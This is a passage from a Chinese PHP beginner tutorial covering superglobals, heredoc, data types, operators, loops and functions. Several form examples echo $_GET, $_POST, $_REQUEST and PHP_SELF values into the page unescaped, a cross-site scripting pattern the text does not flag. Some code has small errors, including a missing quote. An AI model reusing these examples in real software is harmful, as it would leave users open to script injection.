class="line">&lt;?php </span><br><span class="line">$name &#x3D; $_REQUEST[&#39;fname&#39;]; </span><br><span class="line">echo $name; </span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h5 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h5><p>PHP $_POST 广泛用于收集提交 method=”post” 的 HTML 表单后的表单数据。$_POST 也常用于传递变量。</p><p>以下实例显示了一个输入字段（input）及提交按钮(submit)的表单(form)。 当用户通过点击 “Submit” 按钮提交表单数据时, 表单数据将发送至<form>标签中 action 属性中指定的脚本文件。 在这个实例中，我们指定文件来处理表单数据。如果你希望其他的PHP文件来处理该数据，你可以修改该指定的脚本文件名。 然后，我们可以使用超级全局变量 $_POST 来收集表单中的 input 字段数据:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">实例：</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;</span><br><span class="line">Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"> </span><br><span class="line">&lt;?php </span><br><span class="line">$name &#x3D; $_POST[&#39;fname&#39;]; </span><br><span class="line">echo $name; </span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h5 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h5><p>PHP $_GET 也可用于收集提交 HTML 表单 (method=”get”) 之后的表单数据。</p><p>$_GET 也可以收集 URL 中的发送的数据。</p><p>假定我们有一个包含参数的超链接HTML页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;test_get.php?subject&#x3D;PHP&amp;web&#x3D;xxxx.com&quot;&gt;test $GET&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">当用户点击链接 &quot;test $GET&quot;, 参数 &quot;subject&quot; 和 &quot;web&quot; 将发送至&quot;test_get.php&quot;,然后你可以在 &quot;test_get.php&quot; 文件中使用 $_GET 变量来获取这些参数的数据。</span><br><span class="line"></span><br><span class="line">所以输出是：在xxxx.com学习PHP</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下实例显示了 “test_get.php” 文件的代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">实例：</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;在 &quot; . $_GET[&#39;web&#39;] . &quot; 学习 &quot; . $_GET[&#39;subject&#39;];</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注： 符号 . 为字符串连接符</span><br><span class="line">提示： 你如果想学习更多关于 $_POST 和 $_GET 的知识，请访问我们的 PHP 表单 章节。</span><br></pre></td></tr></table></figure><h4 id="界定符EOF"><a href="#界定符EOF" class="headerlink" title="界定符EOF"></a>界定符EOF</h4><p>作用：<br>1.PHP定界符的作用就是按照原样，包括换行格式什么的，输出在其内部的东西；<br>2.在PHP定界符中的任何特殊字符都不需要转义；<br>3.PHP定界符中的PHP变量会被正常的用其值来替换。</p><p>PHP中的定界符格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;&lt;Eof</span><br><span class="line"></span><br><span class="line">……(可以是 html或js等代码)</span><br><span class="line"></span><br><span class="line">Eof;</span><br></pre></td></tr></table></figure><p>注意：<br>首先在&lt;&lt;&lt;之后的字符Eof是自己定义的，随便什么都是可以的，但是结尾处的字符一定要和他一样，他们是成对出现的，就像{}这样的——这是最基本的。</p><p>在PHP定界符使用的过程中，第二个需要注意的问题——也是最经常出现问题的地方：<br>结尾的一行（如上例的Eof;），一定要另起一行，并且改行除了Eof;这个定界符结尾标识之外不能有任何其他字符，前后都不能有，包括空格。</p><p>第三个需要注意的是，如果在定界符中间出现有PHP的变量，你只需要像在其它字符串中输出一样写就行了，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D; &lt;&lt;&lt;Eof</span><br><span class="line"></span><br><span class="line">hello&#123;$name&#125;</span><br><span class="line"></span><br><span class="line">Eof;</span><br><span class="line"></span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>String（字符串）, Integer（整型）, Float（浮点型）, Boolean（布尔型）, Array（数组）, Object（对象）, NULL（空值）。</p><h4 id="PHP字符串"><a href="#PHP字符串" class="headerlink" title="PHP字符串"></a>PHP字符串</h4><p>一个字符串是一串字符的序列，就像 “Hello world!”。<br>你可以将任何文本放在单引号和双引号中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$x &#x3D; &quot;Hello world!&quot;;</span><br><span class="line">echo $x;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;; </span><br><span class="line">$x &#x3D; &#39;Hello world!&#39;;</span><br><span class="line">echo $x;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="PHP数组"><a href="#PHP数组" class="headerlink" title="PHP数组"></a>PHP数组</h4><p>数组可以在一个变量中存储多个值。<br>在以下实例中创建了一个数组， 然后使用 PHP var_dump() 函数返回数组的数据类型和值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br><span class="line">var_dump($cars);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">注： PHP var_dump()函数返回变量的数据类型和值</span><br></pre></td></tr></table></figure><h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><p>对象数据类型也可以用于存储数据。<br>在 PHP 中，对象必须声明。<br>首先，你必须使用class关键字声明类对象。类是可以包含属性和方法的结构。<br>然后我们在类中定义数据类型，然后在实例化的类中使用数据类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Car</span><br><span class="line">&#123;</span><br><span class="line">  var $color;</span><br><span class="line">  function __construct($color&#x3D;&quot;green&quot;) &#123;</span><br><span class="line">    $this-&gt;color &#x3D; $color;</span><br><span class="line">  &#125;</span><br><span class="line">  function what_color() &#123;</span><br><span class="line">    return $this-&gt;color;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">注：以上实例中PHP关键字this就是指向当前对象实例的指针，不指向任何其他对象或类。</span><br></pre></td></tr></table></figure><h4 id="NULL值"><a href="#NULL值" class="headerlink" title="NULL值"></a>NULL值</h4><p>NULL 值表示变量没有值。NULL 是数据类型为 NULL 的值。<br>NULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。<br>可以通过设置变量值为 NULL 来清空变量数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$x&#x3D;&quot;Hello world!&quot;;</span><br><span class="line">$x&#x3D;null;</span><br><span class="line">var_dump($x);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="PHP类型比较"><a href="#PHP类型比较" class="headerlink" title="PHP类型比较"></a>PHP类型比较</h4><p>虽然 PHP 是弱类型语言，但也需要明白变量类型及它们的意义，因为我们经常需要对 PHP 变量进行比较，包含松散和严格比较。</p><ul><li>松散比较：使用两个等号 == 比较，只比较值，不比较类型。</li><li>严格比较：用三个等号 === 比较，除了比较值，也比较类型。</li></ul><h3 id="PHP运算符"><a href="#PHP运算符" class="headerlink" title="PHP运算符"></a>PHP运算符</h3><h4 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h4><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">x + y</td><td align="center">加</td><td align="center">x 和 y 的和</td></tr><tr><td align="center">x - y</td><td align="center">减</td><td align="center">x 和 y 的差</td></tr><tr><td align="center">x * y</td><td align="center">乘</td><td align="center">x 和 y 的积</td></tr><tr><td align="center">x / y</td><td align="center">除</td><td align="center">x 和 y 的商</td></tr><tr><td align="center">x % y</td><td align="center">模（除法的余数）</td><td align="center">x 除以 y 的余数</td></tr><tr><td align="center">- x</td><td align="center">取反</td><td align="center">x 取反</td></tr><tr><td align="center">a . b</td><td align="center">并置</td><td align="center">连接两个字符串</td></tr></tbody></table><h4 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h4><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">x = y</td><td align="center">x = y</td><td align="center">左操作数被设置为右侧表达式的值</td></tr><tr><td align="center">x += y</td><td align="center">x = x + y</td><td align="center">加</td></tr><tr><td align="center">x -= y</td><td align="center">x = x - y</td><td align="center">减</td></tr><tr><td align="center">x *= y</td><td align="center">x = x * y</td><td align="center">乘</td></tr><tr><td align="center">x /= y</td><td align="center">x = x / y</td><td align="center">除</td></tr><tr><td align="center">x %= y</td><td align="center">x = x % y</td><td align="center">摸(除法的余数)</td></tr><tr><td align="center">a .= b</td><td align="center">a = a . b</td><td align="center">连接两个字符串</td></tr></tbody></table><h4 id="递增、递减运算符"><a href="#递增、递减运算符" class="headerlink" title="递增、递减运算符"></a>递增、递减运算符</h4><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">++ x</td><td align="center">预递增</td><td align="center">x 加 1，然后返回 x</td></tr><tr><td align="center">x ++</td><td align="center">后递增</td><td align="center">返回 x，然后 x 加 1</td></tr><tr><td align="center">– x</td><td align="center">预递减</td><td align="center">x 减 1，然后返回 x</td></tr><tr><td align="center">x –</td><td align="center">后递减</td><td align="center">返回 x，然后 x 减 1</td></tr></tbody></table><h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><p>过于简单，类似各类编程语言中的比较运算符，不一一列举</p><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">x and y</td><td align="center">与</td><td align="center">如果 x 和 y 都为 true，则返回 true</td></tr><tr><td align="center">x or y</td><td align="center">或</td><td align="center">如果 x 和 y 至少有一个为 true，则返回 true</td></tr><tr><td align="center">x xor y</td><td align="center">异或</td><td align="center">如果 x 和 y 有且仅有一个为 true，则返回 true</td></tr><tr><td align="center">x &amp;&amp; y</td><td align="center">与</td><td align="center">如果 x 和 y 都为 true，则返回 true</td></tr><tr><td align="center">x</td><td align="center"></td><td align="center">y</td></tr><tr><td align="center">! x</td><td align="center">非</td><td align="center">如果 x 不为 true，则返回 true</td></tr></tbody></table><h4 id="数组运算符"><a href="#数组运算符" class="headerlink" title="数组运算符"></a>数组运算符</h4><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">x + y</td><td align="center">集合</td><td align="center">x 和 y 的集合</td></tr><tr><td align="center">x == y</td><td align="center">相等</td><td align="center">如果 x 和 y 具有相同的键/值对，则返回 true</td></tr><tr><td align="center">x === y</td><td align="center">恒等</td><td align="center">如果 x 和 y 具有相同的键/值对，且顺序相同类型相同，则返回 true</td></tr><tr><td align="center">x != y</td><td align="center">不相等</td><td align="center">如果 x 不等于 y，则返回 true</td></tr><tr><td align="center">x &lt;&gt; y</td><td align="center">不相等</td><td align="center">如果 x 不等于 y，则返回 true</td></tr><tr><td align="center">x !== y</td><td align="center">不恒等</td><td align="center">如果 x 不等于 y，则返回 true</td></tr></tbody></table><h4 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h4><p>另一个条件运算符是”?:”（或三元）运算符<br><strong>语法格式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(expr1) ? (expr2) : (expr3) </span><br></pre></td></tr></table></figure><p>对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。</p><p>自 PHP 5.3 起，可以省略三元运算符中间那部分。表达式 expr1 ?: expr3 在 expr1 求值为 TRUE 时返回 expr1，否则返回 expr3。</p><h4 id="组合比较运算符"><a href="#组合比较运算符" class="headerlink" title="组合比较运算符"></a>组合比较运算符</h4><p><code>**$c = $a &lt;=&gt; $b;**</code><br>解析如下：</p><ul><li>如果 $a &gt; $b, 则 $c 的值为 1。</li><li>如果 $a == $b, 则 $c 的值为 0。</li><li>如果 $a &lt; $b, 则 $c 的值为 -1。</li></ul><h3 id="条件判断、与循环结构语句"><a href="#条件判断、与循环结构语句" class="headerlink" title="条件判断、与循环结构语句"></a>条件判断、与循环结构语句</h3><h4 id="If…else语句"><a href="#If…else语句" class="headerlink" title="If…else语句"></a>If…else语句</h4><ul><li>if 语句 - 在条件成立时执行代码</li><li>if…else 语句 - 在条件成立时执行一块代码，条件不成立时执行另一块代码</li><li>if…elseif….else 语句 - 在若干条件之一成立时执行一个代码块</li><li>switch 语句 - 在若干条件之一成立时执行一个代码块</li></ul><p>实例：如果当前时间小于 10，下面的实例将输出 “Have a good morning!”，如果当前时间不小于 10 且小于 20，则输出 “Have a good day!”，否则输出 “Have a good night!”：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$t&#x3D;date(&quot;H&quot;); &#x2F;&#x2F;date()函数</span><br><span class="line">if ($t&lt;&quot;10&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Have a good morning!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">elseif ($t&lt;&quot;20&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Have a good day!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Have a good night!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="Switch语句"><a href="#Switch语句" class="headerlink" title="Switch语句"></a>Switch语句</h4><p>如果您希望有选择地执行若干代码块之一，请使用 switch 语句</p><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">switch (n)</span><br><span class="line">&#123;</span><br><span class="line">case label1:</span><br><span class="line">    如果 n&#x3D;label1，此处代码将执行;</span><br><span class="line">    break;</span><br><span class="line">case label2:</span><br><span class="line">    如果 n&#x3D;label2，此处代码将执行;</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    如果 n 既不等于 label1 也不等于 label2，此处代码将执行;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">注：代码执行后，使用 break 来阻止代码跳入下一个 case 中继续执行。default 语句用于不存在匹配（即没有 case 为真）时执行。</span><br></pre></td></tr></table></figure><h4 id="While循环语句"><a href="#While循环语句" class="headerlink" title="While循环语句"></a>While循环语句</h4><p>循环执行代码块指定的次数，或者当指定的条件为真时循环执行代码块。</p><p>在您编写代码时，您经常需要让相同的代码块一次又一次地重复运行。我们可以在代码中使用循环语句来完成这个任务。<br>在 PHP 中，提供了下列循环语句：</p><ul><li>while - 只要指定的条件成立，则循环执行代码块</li><li>do…while - 首先执行一次代码块，然后在指定的条件成立时重复这个循环</li><li>for - 循环执行代码块指定的次数</li><li>foreach - 根据数组中每个元素来循环代码块</li></ul><p><strong>while语法：</strong><br>while (条件)<br>{<br>    要执行的代码;<br>}</p><p>实例：下面的实例首先设置变量 i 的值为 1 ($i=1;)。</p><p>然后，只要 i 小于或者等于 5，while 循环将继续运行。循环每运行一次，i 就会递增 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$i&#x3D;1;</span><br><span class="line">while($i&lt;&#x3D;5)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;The number is &quot; . $i . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">The number is 1</span><br><span class="line">The number is 2</span><br><span class="line">The number is 3</span><br><span class="line">The number is 4</span><br><span class="line">The number is 5</span><br></pre></td></tr></table></figure><p><strong>do…while语句</strong><br>do…while 语句会至少执行一次代码，然后检查条件，只要条件成立，就会重复进行循环。</p><p><strong>语法</strong></p><p>do<br>{<br>    要执行的代码;<br>}<br>while (条件);</p><p>实例：下面的实例首先设置变量 i 的值为 1 ($i=1;)。<br>然后，开始 do…while 循环。循环将变量 i 的值递增 1，然后输出。先检查条件（i 小于或者等于 5），只要 i 小于或者等于 5，循环将继续运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$i&#x3D;1;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">    $i++;</span><br><span class="line">    echo &quot;The number is &quot; . $i . &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">while ($i&lt;&#x3D;5);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">The number is 2</span><br><span class="line">The number is 3</span><br><span class="line">The number is 4</span><br><span class="line">The number is 5</span><br><span class="line">The number is 6</span><br></pre></td></tr></table></figure><h4 id="For循环语句"><a href="#For循环语句" class="headerlink" title="For循环语句"></a>For循环语句</h4><p>循环执行代码块指定的次数，或者当指定的条件为真时循环执行代码块。</p><p><strong>for循环</strong><br>for 循环用于您预先知道脚本需要运行的次数的情况。</p><p><strong>语法</strong><br>for (初始值; 条件; 增量)<br>{<br>    要执行的代码;<br>}</p><ul><li>初始值：主要是初始化一个变量值，用于设置一个计数器（但可以是任何在循环的开始被执行一次的代码）。</li><li>条件：循环执行的限制条件。如果为 TRUE，则循环继续。如果为 FALSE，则循环结束。</li><li>增量：主要用于递增计数器（但可以是任何在循环的结束被执行的代码）。</li></ul><p>注释：上面的初始值和增量参数可为空，或者有多个表达式（用逗号分隔）。</p><p>实例：下面的实例定义一个初始值为 i=1 的循环。只要变量 i 小于或者等于 5，循环将继续运行。循环每运行一次，变量 i 就会递增 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i&#x3D;1; $i&lt;&#x3D;5; $i++)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;数字为 &quot; . $i . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">数字为 1</span><br><span class="line">数字为 2</span><br><span class="line">数字为 3</span><br><span class="line">数字为 4</span><br><span class="line">数字为 5</span><br></pre></td></tr></table></figure><p><strong>foreach循环</strong><br>oreach 循环用于遍历数组。</p><p><strong>语法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach ($array as $value)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach ($array as $key &#x3D;&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。</p><p>实例：下面的实例演示了一个输出给定数组的值的循环：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$x&#x3D;array(&quot;Google&quot;,&quot;Qs&quot;,&quot;Taobao&quot;);</span><br><span class="line">foreach ($x as $value)</span><br><span class="line">&#123;</span><br><span class="line">    echo $value . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">Google</span><br><span class="line">Qs</span><br><span class="line">Taobao</span><br></pre></td></tr></table></figure><p>下面的实例演示了一个输出给定数组键与值的循环：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$x&#x3D;array(1&#x3D;&gt;&quot;Google&quot;, 2&#x3D;&gt;&quot;Qs, 3&#x3D;&gt;&quot;Taobao&quot;);</span><br><span class="line">foreach ($x as $key &#x3D;&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;key  为 &quot; . $key . &quot;，对应的 value 为 &quot;. $value . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">key  为 1，对应的 value 为 Google</span><br><span class="line">key  为 2，对应的 value 为 Qs</span><br><span class="line">key  为 3，对应的 value 为 Taobao</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="拓展，使用for循环，实现冒泡排序"><a href="#拓展，使用for循环，实现冒泡排序" class="headerlink" title="拓展，使用for循环，实现冒泡排序"></a>拓展，使用for循环，实现冒泡排序</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr &#x3D; array(5,3,6,2,8,10);</span><br><span class="line">for($i &#x3D; count($arr)-1;$i&gt;&#x3D;0;$i--)&#123;</span><br><span class="line">    for($j &#x3D; 0 ; $j &lt; $i ; $j++)&#123;</span><br><span class="line">        if($arr[$j+1] &gt; $arr[$j] )&#123;</span><br><span class="line">            $aa &#x3D; $arr[$j+1];</span><br><span class="line">            $arr[$j+1] &#x3D; $arr[$j];</span><br><span class="line">            $arr[$j] &#x3D; $aa;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($arr);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="PHP函数"><a href="#PHP函数" class="headerlink" title="PHP函数"></a>PHP函数</h3><p>PHP 的真正威力源自于它的函数。<br>在 PHP 中，提供了超过 1000 个内建的函数。</p><p><strong>PHP内建函数</strong><br>内容过多，自行百度</p><p><strong>PHP 函数</strong><br>如要在页面加载时执行脚本，您可以把它放到函数里。<br>函数是通过调用函数来执行的。<br>你可以在页面的任何位置调用函数。</p><p><strong>创建 PHP 函数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function functionName()</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 要执行的代码</span><br><span 